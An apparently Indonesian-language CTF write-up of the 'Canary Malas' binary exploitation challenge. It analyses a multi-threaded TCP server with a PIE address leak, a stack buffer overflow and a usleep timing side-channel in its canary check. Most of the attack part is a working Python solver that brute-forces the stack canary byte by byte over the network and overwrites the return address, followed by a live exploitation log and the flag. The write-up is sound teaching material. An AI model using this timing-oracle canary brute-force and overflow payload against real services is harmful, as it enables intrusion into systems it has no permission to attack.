# Canary Malas — Writeup

- **Kategori:** Binary Exploitation (Eliminasi)
- **Poin:** 591 · **Solve:** 5
- **Service:** `nc 168.110.219.59 5004`
- **File:** `canary_malas.bin`
- **Deskripsi:** *"Pelindung memakai satu byte acak yang bisa ditebak. Coba semua kemungkinan satu per satu."*

## Flag

```
TechtonicExpoCTF{tebak_satu_D35D4ECD}
```

> `tebak_satu` = kunci rahasia hasil dekripsi di dalam binary. `D35D4ECD` = kode tim.

---

## 1. Rekonesans

```
$ file canary_malas.bin
ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped

checksec:
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

Semua proteksi aktif. Dari tabel GOT terlihat import kunci:
`socket, bind, listen, accept, pthread_create, read, dprintf, snprintf, usleep, signal, __stack_chk_fail`.

➡️ Ini **server TCP multi-thread** (`pthread_create`, **bukan** `fork`). Konsekuensinya: **stack canary sama di semua koneksi** selama proses hidup, karena canary di-copy dari thread utama ke tiap thread → bisa di-brute-force lintas koneksi.

`signal()` hanya dipakai untuk `signal(SIGPIPE, SIG_IGN)`, **tidak** menangani SIGABRT. Jadi kalau canary salah → `__stack_chk_fail` → `abort()` → **seluruh server mati**. Maka canary WAJIB benar sebelum menimpa return address.

## 2. Analisa fungsi (dari disassembly)

### Handler tiap koneksi (`0x13a6`)
```c
canary_asli = get_canary();                     // fungsi 0x1328 -> return fs:[0x28]
dprintf(fd, "// TEBAK SATU //");
dprintf(fd, "Kode rahasia menang: %p", 0x1279); // <-- BOCOR alamat fungsi menang!
dprintf(fd, "1) Uji tebakan canary ...");
read(fd, choice, 4);
if (choice[0] == '1') {                          // OPSI 1: timing oracle
    read(fd, guess, 8);
    if (cek_canary(guess, &canary_asli)) dprintf("COCOK SEMUA!");
    else dprintf("salah.");
} else {                                         // OPSI 2: overflow
    dprintf(fd, "Masukkan kunci brankas: ");
    char buf[0x48];                              // buffer @ rbp-0x50
    read(fd, buf, 0x80);                         // BACA 128 byte -> OVERFLOW
    dprintf(fd, "kunci diterima.");
}                                                // canary check @ epilog
```

Dua bug fatal:
1. **Leak PIE gratis:** `%p` membocorkan alamat runtime fungsi `0x1279` (fungsi "menang").
2. **Buffer overflow:** buffer `0x48` byte tapi `read` menerima `0x80` (128) byte.

### Fungsi cek canary (`0x133f`) — inti "Canary Malas"
```c
for (i = 0; i <= 7; i++) {
    if (guess[i] != canary[i]) return 0;   // mismatch -> langsung keluar
    usleep(60000);                         // tiap byte BENAR = delay 60ms
}
return 1;
```
Return-nya cuma 0/1 (cocok semua atau tidak), **tapi** ada `usleep(60ms)` per byte yang cocok → **timing side-channel**. Delay respon = `(jumlah byte prefiks benar) × 60ms`. Inilah "malas": canary bocor byte-per-byte lewat waktu.

### Fungsi "menang" (`0x1279`)
```c
char key[11];
for (i = 0; i < 10; i++)
    key[i] = rodata[0x2008 + i] ^ ((i+1)*45 + 0x11);  // dekripsi XOR
key[10] = 0;
snprintf(tmp, 0x40, "BENAR! Kunci: %s", key);
write(client_fd, tmp, strlen(tmp));                   // kirim kunci ke kita
_exit(0);
```
Fungsi ini **tidak pernah dipanggil** di alur normal — hanya bisa dicapai dengan menimpa return address. Ia mendekripsi kunci lalu mengirimkannya ke socket.

## 3. Bocorkan kunci secara statis (opsional, tercepat)

Karena dekripsi bersifat deterministik dari `.rodata`, kunci bisa dihitung tanpa server:

```python
data = open('canary_malas.bin','rb').read()
tbl  = data[0x2008:0x2008+10]                       # 4a0efaa499403f18d2a6
key  = bytes((tbl[i] ^ (((i+1)*45 + 0x11) & 0xff)) for i in range(10))
print(key)   # b'tebak_satu'
```

➡️ **kunci = `tebak_satu`**.

## 4. Eksploitasi remote (bukti dari service)

Layout stack handler (frame `0x70`, buffer @ `rbp-0x50`, canary @ `rbp-0x8`):

```
offset 0     : 'A' * 72        ← isi buffer sampai sebelum canary  (0x50 - 0x08 = 72)
offset 72    : <canary 8 byte> ← hasil brute-force timing
offset 80    : 'B' * 8         ← saved rbp
offset 88    : ret_gadget      ← 1 'ret' polos (base+0x1268) untuk align rsp %16
offset 96    : win_addr        ← alamat fungsi 0x1279 (dari leak %p)
```

Langkah:
1. Sambung, parse `Kode rahasia menang: 0x...` → `win_addr`; `base = win_addr - 0x1279`.
2. **Brute canary byte-per-byte** via opsi 1: byte[0] = `0x00` (khas glibc); byte 1..7 ditemukan dgn mencari tebakan yang menambah delay ±60ms.
3. Kirim opsi 2, kirim payload di atas → epilog lolos cek canary → `ret` → fungsi menang → server mengirim `BENAR! Kunci: tebak_satu`.

Ringkasan logika solver (versi lengkap & yang benar-benar jalan ada di `solve.py`, memakai paralelisasi + deteksi restart yang dijelaskan di bawah):

```python
import socket, struct, time, statistics, random
HOST, PORT = '168.110.219.59', 5004
p64 = lambda x: struct.pack('<Q', x)

def measure(guess8):          # opsi 1: ukur waktu respon (timing oracle)
    s = socket.create_connection((HOST, PORT), timeout=10)
    recv_menu(s)              # baca banner + parse leak
    s.sendall(b'1'); time.sleep(0.08)
    t0 = time.time(); s.sendall(guess8)
    wait_verdict(s)           # baca 'salah.' / 'COCOK SEMUA!'
    s.close(); return time.time() - t0

canary = bytearray(b'\x00')   # byte 0 = 0x00
for pos in range(1, 8):
    base = statistics.median(measure(mk(canary,pos,rb)) for rb in random.sample(range(256),5))
    for b in range(256):
        if measure(mk(canary,pos,b)) > base + 0.035:   # +~60ms => byte benar
            canary.append(b); break

# overflow
s = socket.create_connection((HOST, PORT)); _,leak = recv_menu(s)
base_addr = leak - 0x1279
payload = b'A'*72 + bytes(canary) + b'B'*8 + p64(base_addr+0x1268) + p64(leak)
s.sendall(b'2'); time.sleep(0.1); s.sendall(payload)
print(s.recv(4096))           # -> BENAR! Kunci: tebak_satu
```

Catatan: `ret_gadget` (base+0x1268, sebuah `ret` polos) disisipkan agar `rsp` kembali sejajar 16-byte sebelum `snprintf` di fungsi menang (kita masuk lewat `ret`, bukan `call`, sehingga alignment bergeser 8 byte).

### Trik penting: paralelisasi (mengalahkan restart server)

`usleep(60ms)` per byte membuat brute **berurutan** lambat (256 tebakan × per posisi × delay = beberapa menit). Selama itu proses gampang di-restart (pemain lain nge-crash proses lewat canary salah → `abort()`), dan canary ikut berganti → progres reset.

Solusi: opsi 1 **tidak** meng-crash server dan servernya **multi-thread**, jadi 256 tebakan tiap posisi diuji **serentak** (ThreadPoolExecutor). Satu posisi jadi ~<1 detik, dan tebakan benar = respon dgn delay `usleep` terbesar (argmax). Ditambah **deteksi restart**: leak `%p` dipantau tiap koneksi; kalau berubah → proses restart → ulangi brute dari awal. Dengan ini 7 byte selesai < 1 menit, muat dalam jendela stabil server.

## Bukti eksekusi (live)

```
[*] attempt 1: locked base_leak(win)=0x55b59dd03279
[+] canary[1]=0xa0  (par_top=146ms conf=153ms)  00a0
[+] canary[2]=0x63  (par_top=210ms conf=202ms)  00a063
[+] canary[3]=0x78  (par_top=268ms conf=264ms)  00a06378
[+] canary[4]=0xdc  (par_top=322ms conf=325ms)  00a06378dc
[+] canary[5]=0xf0  (par_top=382ms conf=382ms)  00a06378dcf0
[+] canary[6]=0x7e  (par_top=448ms conf=441ms)  00a06378dcf07e
[+] canary[7]=0xdc  (par_top=699ms conf=505ms)  00a06378dcf07edc
[*] FULL CANARY = 00a06378dcf07edc
[*] exploiting: base=0x55b59dd02000 win=0x55b59dd03279 canary=00a06378dcf07edc
=== SERVER RESPONSE ===
Masukkan kunci brankas: kunci diterima.
BENAR! Kunci: tebak_satu
[*] DONE
```

Perhatikan delay respon naik konsisten ±60ms tiap byte benar (146 → 210 → 268 → 322 → 382 → 448 ms) — itulah timing oracle. Byte 0 canary = `0x00` (khas glibc). Kunci `tebak_satu` diambil **langsung dari server**, konsisten dengan hasil dekripsi statis.

## 5. Kesimpulan

| Proteksi | Bypass |
|---|---|
| PIE | Leak `%p` fungsi menang |
| Stack Canary | Timing oracle `usleep(60ms)` → brute byte-per-byte |
| NX / Full RELRO | Tak relevan — cukup ret ke fungsi menang yang sudah ada |

**Flag:**
```
TechtonicExpoCTF{tebak_satu_D35D4ECD}
```
